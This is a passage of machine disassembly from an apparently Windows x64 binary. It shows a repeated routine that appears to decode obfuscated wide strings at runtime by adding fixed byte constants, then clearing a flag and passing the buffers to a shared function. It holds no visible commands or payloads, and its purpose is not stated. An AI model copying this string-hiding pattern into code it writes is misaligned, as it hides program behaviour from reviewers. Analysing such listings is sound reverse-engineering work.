   1400052bc:	66 0f 7f 15 fc e5 2b 	movdqa %xmm2,0x2be5fc(%rip)        # 0x1402c38c0
   1400052c3:	00 
   1400052c4:	66 0f 6f 15 04 e6 2b 	movdqa 0x2be604(%rip),%xmm2        # 0x1402c38d0
   1400052cb:	00 
   1400052cc:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400052d0:	66 0f db d1          	pand   %xmm1,%xmm2
   1400052d4:	66 0f 7f 15 f4 e5 2b 	movdqa %xmm2,0x2be5f4(%rip)        # 0x1402c38d0
   1400052db:	00 
   1400052dc:	66 0f 6f 15 fc e5 2b 	movdqa 0x2be5fc(%rip),%xmm2        # 0x1402c38e0
   1400052e3:	00 
   1400052e4:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400052e8:	66 0f db d1          	pand   %xmm1,%xmm2
   1400052ec:	66 0f 7f 15 ec e5 2b 	movdqa %xmm2,0x2be5ec(%rip)        # 0x1402c38e0
   1400052f3:	00 
   1400052f4:	66 0f fd 05 f4 e5 2b 	paddw  0x2be5f4(%rip),%xmm0        # 0x1402c38f0
   1400052fb:	00 
   1400052fc:	66 0f db c1          	pand   %xmm1,%xmm0
   140005300:	66 0f 7f 05 e8 e5 2b 	movdqa %xmm0,0x2be5e8(%rip)        # 0x1402c38f0
   140005307:	00 
   140005308:	8b 05 f2 e5 2b 00    	mov    0x2be5f2(%rip),%eax        # 0x1402c3900
   14000530e:	83 c0 6f             	add    $0x6f,%eax
   140005311:	0f b6 c0             	movzbl %al,%eax
   140005314:	66 89 05 e5 e5 2b 00 	mov    %ax,0x2be5e5(%rip)        # 0x1402c3900
   14000531b:	0f b7 05 e0 e5 2b 00 	movzwl 0x2be5e0(%rip),%eax        # 0x1402c3902
   140005322:	83 c0 6f             	add    $0x6f,%eax
   140005325:	0f b6 c0             	movzbl %al,%eax
   140005328:	66 89 05 d3 e5 2b 00 	mov    %ax,0x2be5d3(%rip)        # 0x1402c3902
   14000532f:	8b 05 cf e5 2b 00    	mov    0x2be5cf(%rip),%eax        # 0x1402c3904
   140005335:	83 c0 6f             	add    $0x6f,%eax
   140005338:	0f b6 c0             	movzbl %al,%eax
   14000533b:	66 89 05 c2 e5 2b 00 	mov    %ax,0x2be5c2(%rip)        # 0x1402c3904
   140005342:	c6 05 bd e5 2b 00 00 	movb   $0x0,0x2be5bd(%rip)        # 0x1402c3906
   140005349:	80 3d 36 df 2b 00 00 	cmpb   $0x0,0x2bdf36(%rip)        # 0x1402c3286
   140005350:	0f 84 cf 23 00 00    	je     0x140007725
   140005356:	80 3d c9 e5 2b 00 00 	cmpb   $0x0,0x2be5c9(%rip)        # 0x1402c3926
   14000535d:	74 5a                	je     0x1400053b9
   14000535f:	66 0f 6f 05 a9 e5 2b 	movdqa 0x2be5a9(%rip),%xmm0        # 0x1402c3910
   140005366:	00 
   140005367:	66 0f fd 05 51 65 00 	paddw  0x6551(%rip),%xmm0        # 0x14000b8c0
   14000536e:	00 
   14000536f:	66 0f db 05 a9 62 00 	pand   0x62a9(%rip),%xmm0        # 0x14000b620
   140005376:	00 
   140005377:	66 0f 7f 05 91 e5 2b 	movdqa %xmm0,0x2be591(%rip)        # 0x1402c3910
   14000537e:	00 
   14000537f:	66 0f 6f 05 99 e5 2b 	movdqa 0x2be599(%rip),%xmm0        # 0x1402c3920
   140005386:	00 
   140005387:	66 0f fd 05 51 65 00 	paddw  0x6551(%rip),%xmm0        # 0x14000b8e0
   14000538e:	00 
   14000538f:	66 0f db 05 f9 62 00 	pand   0x62f9(%rip),%xmm0        # 0x14000b690
   140005396:	00 
   140005397:	66 0f 7e 05 81 e5 2b 	movd   %xmm0,0x2be581(%rip)        # 0x1402c3920
   14000539e:	00 
   14000539f:	8b 05 7f e5 2b 00    	mov    0x2be57f(%rip),%eax        # 0x1402c3924
   1400053a5:	83 c0 6f             	add    $0x6f,%eax
   1400053a8:	0f b6 c0             	movzbl %al,%eax
   1400053ab:	66 89 05 72 e5 2b 00 	mov    %ax,0x2be572(%rip)        # 0x1402c3924
   1400053b2:	c6 05 6d e5 2b 00 00 	movb   $0x0,0x2be56d(%rip)        # 0x1402c3926
   1400053b9:	48 8d 0d d0 e4 2b 00 	lea    0x2be4d0(%rip),%rcx        # 0x1402c3890
   1400053c0:	48 8d 15 49 e5 2b 00 	lea    0x2be549(%rip),%rdx        # 0x1402c3910
   1400053c7:	e8 14 e5 ff ff       	call   0x1400038e0
   1400053cc:	80 3d b4 de 2b 00 00 	cmpb   $0x0,0x2bdeb4(%rip)        # 0x1402c3287
   1400053d3:	0f 84 9b 23 00 00    	je     0x140007774
   1400053d9:	80 3d d2 e5 2b 00 00 	cmpb   $0x0,0x2be5d2(%rip)        # 0x1402c39b2
   1400053e0:	0f 84 e6 00 00 00    	je     0x1400054cc
   1400053e6:	66 0f 6f 05 02 65 00 	movdqa 0x6502(%rip),%xmm0        # 0x14000b8f0
   1400053ed:	00 
   1400053ee:	66 0f 6f 15 3a e5 2b 	movdqa 0x2be53a(%rip),%xmm2        # 0x1402c3930
   1400053f5:	00 
   1400053f6:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400053fa:	66 0f 6f 0d 1e 62 00 	movdqa 0x621e(%rip),%xmm1        # 0x14000b620
   140005401:	00 
   140005402:	66 0f db d1          	pand   %xmm1,%xmm2
   140005406:	66 0f 7f 15 22 e5 2b 	movdqa %xmm2,0x2be522(%rip)        # 0x1402c3930
   14000540d:	00 
   14000540e:	66 0f 6f 15 2a e5 2b 	movdqa 0x2be52a(%rip),%xmm2        # 0x1402c3940
   140005415:	00 
   140005416:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000541a:	66 0f db d1          	pand   %xmm1,%xmm2
   14000541e:	66 0f 7f 15 1a e5 2b 	movdqa %xmm2,0x2be51a(%rip)        # 0x1402c3940
   140005425:	00 
   140005426:	66 0f 6f 15 22 e5 2b 	movdqa 0x2be522(%rip),%xmm2        # 0x1402c3950
   14000542d:	00 
   14000542e:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005432:	66 0f db d1          	pand   %xmm1,%xmm2
   140005436:	66 0f 7f 15 12 e5 2b 	movdqa %xmm2,0x2be512(%rip)        # 0x1402c3950
   14000543d:	00 
   14000543e:	66 0f 6f 15 1a e5 2b 	movdqa 0x2be51a(%rip),%xmm2        # 0x1402c3960
   140005445:	00 
   140005446:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000544a:	66 0f db d1          	pand   %xmm1,%xmm2
   14000544e:	66 0f 7f 15 0a e5 2b 	movdqa %xmm2,0x2be50a(%rip)        # 0x1402c3960
   140005455:	00 
   140005456:	66 0f 6f 15 12 e5 2b 	movdqa 0x2be512(%rip),%xmm2        # 0x1402c3970
   14000545d:	00 
   14000545e:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005462:	66 0f db d1          	pand   %xmm1,%xmm2
   140005466:	66 0f 7f 15 02 e5 2b 	movdqa %xmm2,0x2be502(%rip)        # 0x1402c3970
   14000546d:	00 
   14000546e:	66 0f 6f 15 0a e5 2b 	movdqa 0x2be50a(%rip),%xmm2        # 0x1402c3980
   140005475:	00 
   140005476:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000547a:	66 0f db d1          	pand   %xmm1,%xmm2
   14000547e:	66 0f 7f 15 fa e4 2b 	movdqa %xmm2,0x2be4fa(%rip)        # 0x1402c3980
   140005485:	00 
   140005486:	66 0f 6f 15 02 e5 2b 	movdqa 0x2be502(%rip),%xmm2        # 0x1402c3990
   14000548d:	00 
   14000548e:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005492:	66 0f db d1          	pand   %xmm1,%xmm2
   140005496:	66 0f 7f 15 f2 e4 2b 	movdqa %xmm2,0x2be4f2(%rip)        # 0x1402c3990
   14000549d:	00 
   14000549e:	66 0f fd 05 fa e4 2b 	paddw  0x2be4fa(%rip),%xmm0        # 0x1402c39a0
   1400054a5:	00 
   1400054a6:	66 0f db c1          	pand   %xmm1,%xmm0
   1400054aa:	66 0f 7f 05 ee e4 2b 	movdqa %xmm0,0x2be4ee(%rip)        # 0x1402c39a0
   1400054b1:	00 
   1400054b2:	8b 05 f8 e4 2b 00    	mov    0x2be4f8(%rip),%eax        # 0x1402c39b0
   1400054b8:	83 c0 63             	add    $0x63,%eax
   1400054bb:	0f b6 c0             	movzbl %al,%eax
   1400054be:	66 89 05 eb e4 2b 00 	mov    %ax,0x2be4eb(%rip)        # 0x1402c39b0
   1400054c5:	c6 05 e6 e4 2b 00 00 	movb   $0x0,0x2be4e6(%rip)        # 0x1402c39b2
   1400054cc:	80 3d b5 dd 2b 00 00 	cmpb   $0x0,0x2bddb5(%rip)        # 0x1402c3288
   1400054d3:	0f 84 e0 22 00 00    	je     0x1400077b9
   1400054d9:	80 3d 02 e5 2b 00 00 	cmpb   $0x0,0x2be502(%rip)        # 0x1402c39e2
   1400054e0:	74 56                	je     0x140005538
   1400054e2:	66 0f 6f 05 06 64 00 	movdqa 0x6406(%rip),%xmm0        # 0x14000b8f0
   1400054e9:	00 
   1400054ea:	66 0f 6f 0d ce e4 2b 	movdqa 0x2be4ce(%rip),%xmm1        # 0x1402c39c0
   1400054f1:	00 
   1400054f2:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400054f6:	66 0f 6f 15 22 61 00 	movdqa 0x6122(%rip),%xmm2        # 0x14000b620
   1400054fd:	00 
   1400054fe:	66 0f db ca          	pand   %xmm2,%xmm1
   140005502:	66 0f 7f 0d b6 e4 2b 	movdqa %xmm1,0x2be4b6(%rip)        # 0x1402c39c0
   140005509:	00 
   14000550a:	66 0f fd 05 be e4 2b 	paddw  0x2be4be(%rip),%xmm0        # 0x1402c39d0
   140005511:	00 
   140005512:	66 0f db c2          	pand   %xmm2,%xmm0
   140005516:	66 0f 7f 05 b2 e4 2b 	movdqa %xmm0,0x2be4b2(%rip)        # 0x1402c39d0
   14000551d:	00 
   14000551e:	8b 05 bc e4 2b 00    	mov    0x2be4bc(%rip),%eax        # 0x1402c39e0
   140005524:	83 c0 63             	add    $0x63,%eax
   140005527:	0f b6 c0             	movzbl %al,%eax
   14000552a:	66 89 05 af e4 2b 00 	mov    %ax,0x2be4af(%rip)        # 0x1402c39e0
   140005531:	c6 05 aa e4 2b 00 00 	movb   $0x0,0x2be4aa(%rip)        # 0x1402c39e2
   140005538:	48 8d 0d f1 e3 2b 00 	lea    0x2be3f1(%rip),%rcx        # 0x1402c3930
   14000553f:	48 8d 15 7a e4 2b 00 	lea    0x2be47a(%rip),%rdx        # 0x1402c39c0
   140005546:	e8 95 e3 ff ff       	call   0x1400038e0
   14000554b:	80 3d 37 dd 2b 00 00 	cmpb   $0x0,0x2bdd37(%rip)        # 0x1402c3289
   140005552:	0f 84 92 22 00 00    	je     0x1400077ea
   140005558:	80 3d 0b e5 2b 00 00 	cmpb   $0x0,0x2be50b(%rip)        # 0x1402c3a6a
   14000555f:	0f 84 1c 01 00 00    	je     0x140005681
   140005565:	66 0f 6f 05 93 63 00 	movdqa 0x6393(%rip),%xmm0        # 0x14000b900
   14000556c:	00 
   14000556d:	66 0f 6f 15 7b e4 2b 	movdqa 0x2be47b(%rip),%xmm2        # 0x1402c39f0
   140005574:	00 
   140005575:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005579:	66 0f 6f 0d 9f 60 00 	movdqa 0x609f(%rip),%xmm1        # 0x14000b620
   140005580:	00 
   140005581:	66 0f db d1          	pand   %xmm1,%xmm2
   140005585:	66 0f 7f 15 63 e4 2b 	movdqa %xmm2,0x2be463(%rip)        # 0x1402c39f0
   14000558c:	00 
   14000558d:	66 0f 6f 15 6b e4 2b 	movdqa 0x2be46b(%rip),%xmm2        # 0x1402c3a00
   140005594:	00 
   140005595:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005599:	66 0f db d1          	pand   %xmm1,%xmm2
   14000559d:	66 0f 7f 15 5b e4 2b 	movdqa %xmm2,0x2be45b(%rip)        # 0x1402c3a00
   1400055a4:	00 
   1400055a5:	66 0f 6f 15 63 e4 2b 	movdqa 0x2be463(%rip),%xmm2        # 0x1402c3a10
   1400055ac:	00 
   1400055ad:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400055b1:	66 0f db d1          	pand   %xmm1,%xmm2
   1400055b5:	66 0f 7f 15 53 e4 2b 	movdqa %xmm2,0x2be453(%rip)        # 0x1402c3a10
   1400055bc:	00 
   1400055bd:	66 0f 6f 15 5b e4 2b 	movdqa 0x2be45b(%rip),%xmm2        # 0x1402c3a20
   1400055c4:	00 
   1400055c5:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400055c9:	66 0f db d1          	pand   %xmm1,%xmm2
   1400055cd:	66 0f 7f 15 4b e4 2b 	movdqa %xmm2,0x2be44b(%rip)        # 0x1402c3a20
   1400055d4:	00 
   1400055d5:	66 0f 6f 15 53 e4 2b 	movdqa 0x2be453(%rip),%xmm2        # 0x1402c3a30
   1400055dc:	00 
   1400055dd:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400055e1:	66 0f db d1          	pand   %xmm1,%xmm2
   1400055e5:	66 0f 7f 15 43 e4 2b 	movdqa %xmm2,0x2be443(%rip)        # 0x1402c3a30
   1400055ec:	00 
   1400055ed:	66 0f 6f 15 4b e4 2b 	movdqa 0x2be44b(%rip),%xmm2        # 0x1402c3a40
   1400055f4:	00 
   1400055f5:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400055f9:	66 0f db d1          	pand   %xmm1,%xmm2
   1400055fd:	66 0f 7f 15 3b e4 2b 	movdqa %xmm2,0x2be43b(%rip)        # 0x1402c3a40
   140005604:	00 
   140005605:	66 0f fd 05 43 e4 2b 	paddw  0x2be443(%rip),%xmm0        # 0x1402c3a50
   14000560c:	00 
   14000560d:	66 0f db c1          	pand   %xmm1,%xmm0
   140005611:	66 0f 7f 05 37 e4 2b 	movdqa %xmm0,0x2be437(%rip)        # 0x1402c3a50
   140005618:	00 
   140005619:	8b 05 41 e4 2b 00    	mov    0x2be441(%rip),%eax        # 0x1402c3a60
   14000561f:	83 c0 3b             	add    $0x3b,%eax
   140005622:	0f b6 c0             	movzbl %al,%eax
   140005625:	66 89 05 34 e4 2b 00 	mov    %ax,0x2be434(%rip)        # 0x1402c3a60
   14000562c:	0f b7 05 2f e4 2b 00 	movzwl 0x2be42f(%rip),%eax        # 0x1402c3a62
   140005633:	83 c0 3b             	add    $0x3b,%eax
   140005636:	0f b6 c0             	movzbl %al,%eax
   140005639:	66 89 05 22 e4 2b 00 	mov    %ax,0x2be422(%rip)        # 0x1402c3a62
   140005640:	8b 05 1e e4 2b 00    	mov    0x2be41e(%rip),%eax        # 0x1402c3a64
   140005646:	83 c0 3b             	add    $0x3b,%eax
   140005649:	0f b6 c0             	movzbl %al,%eax
   14000564c:	66 89 05 11 e4 2b 00 	mov    %ax,0x2be411(%rip)        # 0x1402c3a64
   140005653:	0f b7 05 0c e4 2b 00 	movzwl 0x2be40c(%rip),%eax        # 0x1402c3a66
   14000565a:	83 c0 3b             	add    $0x3b,%eax
   14000565d:	0f b6 c0             	movzbl %al,%eax
   140005660:	66 89 05 ff e3 2b 00 	mov    %ax,0x2be3ff(%rip)        # 0x1402c3a66
   140005667:	8b 05 fb e3 2b 00    	mov    0x2be3fb(%rip),%eax        # 0x1402c3a68
   14000566d:	83 c0 3b             	add    $0x3b,%eax
   140005670:	0f b6 c0             	movzbl %al,%eax
   140005673:	66 89 05 ee e3 2b 00 	mov    %ax,0x2be3ee(%rip)        # 0x1402c3a68
   14000567a:	c6 05 e9 e3 2b 00 00 	movb   $0x0,0x2be3e9(%rip)        # 0x1402c3a6a
   140005681:	80 3d 02 dc 2b 00 00 	cmpb   $0x0,0x2bdc02(%rip)        # 0x1402c328a
   140005688:	0f 84 fa 21 00 00    	je     0x140007888
   14000568e:	80 3d f5 e3 2b 00 00 	cmpb   $0x0,0x2be3f5(%rip)        # 0x1402c3a8a
   140005695:	74 5a                	je     0x1400056f1
   140005697:	66 0f 6f 05 d1 e3 2b 	movdqa 0x2be3d1(%rip),%xmm0        # 0x1402c3a70
   14000569e:	00 
   14000569f:	66 0f fd 05 59 62 00 	paddw  0x6259(%rip),%xmm0        # 0x14000b900
   1400056a6:	00 
   1400056a7:	66 0f db 05 71 5f 00 	pand   0x5f71(%rip),%xmm0        # 0x14000b620
   1400056ae:	00 
   1400056af:	66 0f 7f 05 b9 e3 2b 	movdqa %xmm0,0x2be3b9(%rip)        # 0x1402c3a70
   1400056b6:	00 
   1400056b7:	f3 0f 7e 05 c1 e3 2b 	movq   0x2be3c1(%rip),%xmm0        # 0x1402c3a80
   1400056be:	00 
   1400056bf:	66 0f fd 05 59 62 00 	paddw  0x6259(%rip),%xmm0        # 0x14000b920
   1400056c6:	00 
   1400056c7:	66 0f db 05 91 5f 00 	pand   0x5f91(%rip),%xmm0        # 0x14000b660
   1400056ce:	00 
   1400056cf:	66 0f d6 05 a9 e3 2b 	movq   %xmm0,0x2be3a9(%rip)        # 0x1402c3a80
   1400056d6:	00 
   1400056d7:	8b 05 ab e3 2b 00    	mov    0x2be3ab(%rip),%eax        # 0x1402c3a88
   1400056dd:	83 c0 3b             	add    $0x3b,%eax
   1400056e0:	0f b6 c0             	movzbl %al,%eax
   1400056e3:	66 89 05 9e e3 2b 00 	mov    %ax,0x2be39e(%rip)        # 0x1402c3a88
   1400056ea:	c6 05 99 e3 2b 00 00 	movb   $0x0,0x2be399(%rip)        # 0x1402c3a8a
   1400056f1:	48 8d 0d f8 e2 2b 00 	lea    0x2be2f8(%rip),%rcx        # 0x1402c39f0
   1400056f8:	48 8d 15 71 e3 2b 00 	lea    0x2be371(%rip),%rdx        # 0x1402c3a70
   1400056ff:	e8 dc e1 ff ff       	call   0x1400038e0
   140005704:	80 3d 80 db 2b 00 00 	cmpb   $0x0,0x2bdb80(%rip)        # 0x1402c328b
   14000570b:	0f 84 cd 21 00 00    	je     0x1400078de
   140005711:	80 3d ea e3 2b 00 00 	cmpb   $0x0,0x2be3ea(%rip)        # 0x1402c3b02
   140005718:	0f 84 ce 00 00 00    	je     0x1400057ec
   14000571e:	66 0f 6f 05 0a 62 00 	movdqa 0x620a(%rip),%xmm0        # 0x14000b930
   140005725:	00 
   140005726:	66 0f 6f 15 62 e3 2b 	movdqa 0x2be362(%rip),%xmm2        # 0x1402c3a90
   14000572d:	00 
   14000572e:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005732:	66 0f 6f 0d e6 5e 00 	movdqa 0x5ee6(%rip),%xmm1        # 0x14000b620
   140005739:	00 
   14000573a:	66 0f db d1          	pand   %xmm1,%xmm2
   14000573e:	66 0f 7f 15 4a e3 2b 	movdqa %xmm2,0x2be34a(%rip)        # 0x1402c3a90
   140005745:	00 
   140005746:	66 0f 6f 15 52 e3 2b 	movdqa 0x2be352(%rip),%xmm2        # 0x1402c3aa0
   14000574d:	00 
   14000574e:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005752:	66 0f db d1          	pand   %xmm1,%xmm2
   140005756:	66 0f 7f 15 42 e3 2b 	movdqa %xmm2,0x2be342(%rip)        # 0x1402c3aa0
   14000575d:	00 
   14000575e:	66 0f 6f 15 4a e3 2b 	movdqa 0x2be34a(%rip),%xmm2        # 0x1402c3ab0
   140005765:	00 
   140005766:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000576a:	66 0f db d1          	pand   %xmm1,%xmm2
   14000576e:	66 0f 7f 15 3a e3 2b 	movdqa %xmm2,0x2be33a(%rip)        # 0x1402c3ab0
   140005775:	00 
   140005776:	66 0f 6f 15 42 e3 2b 	movdqa 0x2be342(%rip),%xmm2        # 0x1402c3ac0
   14000577d:	00 
   14000577e:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005782:	66 0f db d1          	pand   %xmm1,%xmm2
   140005786:	66 0f 7f 15 32 e3 2b 	movdqa %xmm2,0x2be332(%rip)        # 0x1402c3ac0
   14000578d:	00 
   14000578e:	66 0f 6f 15 3a e3 2b 	movdqa 0x2be33a(%rip),%xmm2        # 0x1402c3ad0
   140005795:	00 
   140005796:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000579a:	66 0f db d1          	pand   %xmm1,%xmm2
   14000579e:	66 0f 7f 15 2a e3 2b 	movdqa %xmm2,0x2be32a(%rip)        # 0x1402c3ad0
   1400057a5:	00 
   1400057a6:	66 0f 6f 15 32 e3 2b 	movdqa 0x2be332(%rip),%xmm2        # 0x1402c3ae0
   1400057ad:	00 
   1400057ae:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400057b2:	66 0f db d1          	pand   %xmm1,%xmm2
   1400057b6:	66 0f 7f 15 22 e3 2b 	movdqa %xmm2,0x2be322(%rip)        # 0x1402c3ae0
   1400057bd:	00 
   1400057be:	66 0f fd 05 2a e3 2b 	paddw  0x2be32a(%rip),%xmm0        # 0x1402c3af0
   1400057c5:	00 
   1400057c6:	66 0f db c1          	pand   %xmm1,%xmm0
   1400057ca:	66 0f 7f 05 1e e3 2b 	movdqa %xmm0,0x2be31e(%rip)        # 0x1402c3af0
   1400057d1:	00 
   1400057d2:	8b 05 28 e3 2b 00    	mov    0x2be328(%rip),%eax        # 0x1402c3b00
   1400057d8:	83 c0 15             	add    $0x15,%eax
   1400057db:	0f b6 c0             	movzbl %al,%eax
   1400057de:	66 89 05 1b e3 2b 00 	mov    %ax,0x2be31b(%rip)        # 0x1402c3b00
   1400057e5:	c6 05 16 e3 2b 00 00 	movb   $0x0,0x2be316(%rip)        # 0x1402c3b02
   1400057ec:	80 3d 99 da 2b 00 00 	cmpb   $0x0,0x2bda99(%rip)        # 0x1402c328c
   1400057f3:	0f 84 7e 21 00 00    	je     0x140007977
   1400057f9:	80 3d 22 e3 2b 00 00 	cmpb   $0x0,0x2be322(%rip)        # 0x1402c3b22
   140005800:	74 3a                	je     0x14000583c
   140005802:	66 0f 6f 05 06 e3 2b 	movdqa 0x2be306(%rip),%xmm0        # 0x1402c3b10
   140005809:	00 
   14000580a:	66 0f fd 05 1e 61 00 	paddw  0x611e(%rip),%xmm0        # 0x14000b930
   140005811:	00 
   140005812:	66 0f db 05 06 5e 00 	pand   0x5e06(%rip),%xmm0        # 0x14000b620
   140005819:	00 
   14000581a:	66 0f 7f 05 ee e2 2b 	movdqa %xmm0,0x2be2ee(%rip)        # 0x1402c3b10
   140005821:	00 
   140005822:	8b 05 f8 e2 2b 00    	mov    0x2be2f8(%rip),%eax        # 0x1402c3b20
   140005828:	83 c0 15             	add    $0x15,%eax
   14000582b:	0f b6 c0             	movzbl %al,%eax
   14000582e:	66 89 05 eb e2 2b 00 	mov    %ax,0x2be2eb(%rip)        # 0x1402c3b20
   140005835:	c6 05 e6 e2 2b 00 00 	movb   $0x0,0x2be2e6(%rip)        # 0x1402c3b22
   14000583c:	48 8d 0d 4d e2 2b 00 	lea    0x2be24d(%rip),%rcx        # 0x1402c3a90
   140005843:	48 8d 15 c6 e2 2b 00 	lea    0x2be2c6(%rip),%rdx        # 0x1402c3b10
   14000584a:	e8 91 e0 ff ff       	call   0x1400038e0
   14000584f:	80 3d 37 da 2b 00 00 	cmpb   $0x0,0x2bda37(%rip)        # 0x1402c328d
   140005856:	0f 84 60 21 00 00    	je     0x1400079bc
   14000585c:	80 3d 41 e3 2b 00 00 	cmpb   $0x0,0x2be341(%rip)        # 0x1402c3ba4
   140005863:	0f 84 e6 00 00 00    	je     0x14000594f
   140005869:	66 0f 6f 05 df 60 00 	movdqa 0x60df(%rip),%xmm0        # 0x14000b950
   140005870:	00 
   140005871:	66 0f 6f 15 b7 e2 2b 	movdqa 0x2be2b7(%rip),%xmm2        # 0x1402c3b30
   140005878:	00 
   140005879:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000587d:	66 0f 6f 0d 9b 5d 00 	movdqa 0x5d9b(%rip),%xmm1        # 0x14000b620
   140005884:	00 
   140005885:	66 0f db d1          	pand   %xmm1,%xmm2
   140005889:	66 0f 7f 15 9f e2 2b 	movdqa %xmm2,0x2be29f(%rip)        # 0x1402c3b30
   140005890:	00 
   140005891:	66 0f 6f 15 a7 e2 2b 	movdqa 0x2be2a7(%rip),%xmm2        # 0x1402c3b40
   140005898:	00 
   140005899:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000589d:	66 0f db d1          	pand   %xmm1,%xmm2
   1400058a1:	66 0f 7f 15 97 e2 2b 	movdqa %xmm2,0x2be297(%rip)        # 0x1402c3b40
   1400058a8:	00 
   1400058a9:	66 0f 6f 15 9f e2 2b 	movdqa 0x2be29f(%rip),%xmm2        # 0x1402c3b50
   1400058b0:	00 
   1400058b1:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400058b5:	66 0f db d1          	pand   %xmm1,%xmm2
   1400058b9:	66 0f 7f 15 8f e2 2b 	movdqa %xmm2,0x2be28f(%rip)        # 0x1402c3b50
   1400058c0:	00 
   1400058c1:	66 0f 6f 15 97 e2 2b 	movdqa 0x2be297(%rip),%xmm2        # 0x1402c3b60
   1400058c8:	00 
   1400058c9:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400058cd:	66 0f db d1          	pand   %xmm1,%xmm2
   1400058d1:	66 0f 7f 15 87 e2 2b 	movdqa %xmm2,0x2be287(%rip)        # 0x1402c3b60
   1400058d8:	00 
   1400058d9:	66 0f 6f 15 8f e2 2b 	movdqa 0x2be28f(%rip),%xmm2        # 0x1402c3b70
   1400058e0:	00 
   1400058e1:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400058e5:	66 0f db d1          	pand   %xmm1,%xmm2
   1400058e9:	66 0f 7f 15 7f e2 2b 	movdqa %xmm2,0x2be27f(%rip)        # 0x1402c3b70
   1400058f0:	00 
   1400058f1:	66 0f 6f 15 87 e2 2b 	movdqa 0x2be287(%rip),%xmm2        # 0x1402c3b80
   1400058f8:	00 
   1400058f9:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400058fd:	66 0f db d1          	pand   %xmm1,%xmm2
   140005901:	66 0f 7f 15 77 e2 2b 	movdqa %xmm2,0x2be277(%rip)        # 0x1402c3b80
   140005908:	00 
   140005909:	66 0f fd 05 7f e2 2b 	paddw  0x2be27f(%rip),%xmm0        # 0x1402c3b90
   140005910:	00 
   140005911:	66 0f db c1          	pand   %xmm1,%xmm0
   140005915:	66 0f 7f 05 73 e2 2b 	movdqa %xmm0,0x2be273(%rip)        # 0x1402c3b90
   14000591c:	00 
   14000591d:	b8 cb 00 00 00       	mov    $0xcb,%eax
   140005922:	03 05 78 e2 2b 00    	add    0x2be278(%rip),%eax        # 0x1402c3ba0
   140005928:	0f b6 c0             	movzbl %al,%eax
   14000592b:	66 89 05 6e e2 2b 00 	mov    %ax,0x2be26e(%rip)        # 0x1402c3ba0
   140005932:	0f b7 05 69 e2 2b 00 	movzwl 0x2be269(%rip),%eax        # 0x1402c3ba2
   140005939:	05 cb 00 00 00       	add    $0xcb,%eax
   14000593e:	0f b6 c0             	movzbl %al,%eax
   140005941:	66 89 05 5a e2 2b 00 	mov    %ax,0x2be25a(%rip)        # 0x1402c3ba2
   140005948:	c6 05 55 e2 2b 00 00 	movb   $0x0,0x2be255(%rip)        # 0x1402c3ba4
   14000594f:	80 3d 38 d9 2b 00 00 	cmpb   $0x0,0x2bd938(%rip)        # 0x1402c328e
   140005956:	0f 84 fa 20 00 00    	je     0x140007a56
   14000595c:	80 3d 61 e2 2b 00 00 	cmpb   $0x0,0x2be261(%rip)        # 0x1402c3bc4
   140005963:	74 47                	je     0x1400059ac
   140005965:	66 0f 6f 05 43 e2 2b 	movdqa 0x2be243(%rip),%xmm0        # 0x1402c3bb0
   14000596c:	00 
   14000596d:	66 0f fd 05 db 5f 00 	paddw  0x5fdb(%rip),%xmm0        # 0x14000b950
   140005974:	00 
   140005975:	66 0f db 05 a3 5c 00 	pand   0x5ca3(%rip),%xmm0        # 0x14000b620
   14000597c:	00 
   14000597d:	66 0f 7f 05 2b e2 2b 	movdqa %xmm0,0x2be22b(%rip)        # 0x1402c3bb0
   140005984:	00 
   140005985:	66 0f 6f 05 33 e2 2b 	movdqa 0x2be233(%rip),%xmm0        # 0x1402c3bc0
   14000598c:	00 
   14000598d:	66 0f fd 05 db 5f 00 	paddw  0x5fdb(%rip),%xmm0        # 0x14000b970
   140005994:	00 
   140005995:	66 0f db 05 f3 5c 00 	pand   0x5cf3(%rip),%xmm0        # 0x14000b690
   14000599c:	00 
   14000599d:	66 0f 7e 05 1b e2 2b 	movd   %xmm0,0x2be21b(%rip)        # 0x1402c3bc0
   1400059a4:	00 
   1400059a5:	c6 05 18 e2 2b 00 00 	movb   $0x0,0x2be218(%rip)        # 0x1402c3bc4
   1400059ac:	48 8d 0d 7d e1 2b 00 	lea    0x2be17d(%rip),%rcx        # 0x1402c3b30
   1400059b3:	48 8d 15 f6 e1 2b 00 	lea    0x2be1f6(%rip),%rdx        # 0x1402c3bb0
   1400059ba:	e8 21 df ff ff       	call   0x1400038e0
   1400059bf:	48 8d 8d 40 0e 00 00 	lea    0xe40(%rbp),%rcx
   1400059c6:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   1400059cc:	31 d2                	xor    %edx,%edx
   1400059ce:	e8 8d 46 00 00       	call   0x14000a060
   1400059d3:	80 3d b5 d8 2b 00 00 	cmpb   $0x0,0x2bd8b5(%rip)        # 0x1402c328f
   1400059da:	0f 84 bc 20 00 00    	je     0x140007a9c
   1400059e0:	80 3d 05 e2 2b 00 00 	cmpb   $0x0,0x2be205(%rip)        # 0x1402c3bec
   1400059e7:	74 67                	je     0x140005a50
   1400059e9:	66 0f 6f 05 df e1 2b 	movdqa 0x2be1df(%rip),%xmm0        # 0x1402c3bd0
   1400059f0:	00 
